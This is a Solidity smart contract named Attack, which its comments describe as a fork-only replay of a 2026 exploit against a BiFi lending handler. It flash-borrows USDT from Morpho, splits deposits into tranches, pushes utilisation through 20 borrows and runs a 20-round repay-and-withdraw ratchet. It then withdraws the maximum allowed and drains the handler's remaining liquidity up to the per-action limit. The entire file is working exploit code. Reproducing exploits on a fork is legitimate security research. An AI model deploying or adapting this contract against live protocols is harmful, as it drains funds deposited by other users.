// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IERC20 {
    // USDT on mainnet returns no data for approve/transfer; declare them void so the
    // high-level call does not revert on ABI-decoding empty returndata.
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function balanceOf(address who) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IHandler {
    function deposit(uint256 unifiedTokenAmount, bool flag) external payable;
    function borrow(uint256 unifiedTokenAmount, bool flag) external;
    function withdraw(uint256 unifiedTokenAmount, bool flag) external;
    function repay(uint256 unifiedTokenAmount, bool flag) external payable;
}

interface IMorpho {
    function flashLoan(address asset, uint256 assets, bytes calldata data) external;
}

/// @notice Fork-only replay of the 2026-10-17 BiFi idle-market interest accrual exploit.
/// Replicates the on-chain recipe byte-for-byte at the handler level:
///   5 tranche deposits (total = flash amount) -> 20 small borrows (push utilisation in steps)
///   -> 20 x (repay 1.48M, withdraw 2M) ratchet -> repay(max) -> withdraw(max) x3
/// then drains whatever liquidity is left (capped by the per-action limit).
contract Attack {
    IERC20 public immutable usdt;
    IHandler public immutable handler;
    IMorpho public immutable morpho;
    address public immutable owner;

    uint256 public constant UNIT = 1e18;
    uint256 public constant PER_ACTION_LIMIT = 2_900_000e18; // handler limitOfAction = 3,000,000 tokens
    uint256 public constant N = 20;
    uint256 public constant BORROW = 1_480_000 * UNIT;
    uint256 public constant WITHDRAW = 2_000_000 * UNIT;

    uint256 public profit;
    uint256 public totalWithdrawn;
    uint256 public finalDebtRepaid;
    uint256 public handlerBalBefore;

    constructor(address _usdt, address _handler, address _morpho) {
        usdt = IERC20(_usdt);
        handler = IHandler(_handler);
        morpho = IMorpho(_morpho);
        owner = msg.sender;
    }

    function run(uint256 flashAmount) external {
        require(msg.sender == owner, "owner");
        usdt.approve(address(handler), type(uint256).max);
        usdt.approve(address(morpho), type(uint256).max);
        handlerBalBefore = usdt.balanceOf(address(handler));
        morpho.flashLoan(address(usdt), flashAmount, "");
        profit = usdt.balanceOf(address(this));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(morpho), "morpho");

        // `assets` is in underlying units (USDT: 6 decimals); the handler accounts in
        // unified 18-decimal units.
        uint256 a = assets * 1e12;
        // 1. tranche deposits summing to `a` (exact on-chain fractions of the 40M flash)
        uint256 d1 = a * 2995 / 1_000_000;        // 119,800 / 40,000,000
        uint256 d2 = a * 11964 / 1_000_000;       // 478,560
        uint256 d3 = a * 44327 / 1_000_000;       // 1,773,080
        uint256 d4 = a * 178736 / 1_000_000;      // 7,149,440
        handler.deposit(d1, false);
        handler.deposit(d2, false);
        handler.deposit(d3, false);
        handler.deposit(d4, false);
        handler.deposit(a - d1 - d2 - d3 - d4, false);
        handler.deposit(0, false);

        // 2. push utilisation in 20 steps
        for (uint256 i = 0; i < N; i++) {
            handler.borrow(BORROW, false);
        }

        // 3. ratchet: repay a little, withdraw more, 20 times
        for (uint256 i = 0; i < N; i++) {
            handler.repay(BORROW, false);
            uint256 before = usdt.balanceOf(address(this));
            handler.withdraw(WITHDRAW, false);
            totalWithdrawn += usdt.balanceOf(address(this)) - before;
        }

        // 4. clear remaining debt, then take every last token the handler will release
        uint256 beforeRepay = usdt.balanceOf(address(this));
        handler.repay(type(uint256).max, false);
        finalDebtRepaid = beforeRepay - usdt.balanceOf(address(this));

        for (uint256 i = 0; i < 3; i++) {
            uint256 b0 = usdt.balanceOf(address(this));
            try handler.withdraw(type(uint256).max, false) {
                totalWithdrawn += usdt.balanceOf(address(this)) - b0;
            } catch { break; }
        }

        uint256 bal = usdt.balanceOf(address(handler));
        if (bal > 0) {
            uint256 req = bal * 1e12; // 6-dec underlying -> 18-dec unified
            if (req > PER_ACTION_LIMIT) req = PER_ACTION_LIMIT;
            uint256 b0 = usdt.balanceOf(address(this));
            try handler.withdraw(req, false) {
                totalWithdrawn += usdt.balanceOf(address(this)) - b0;
            } catch {}
        }
    }
}
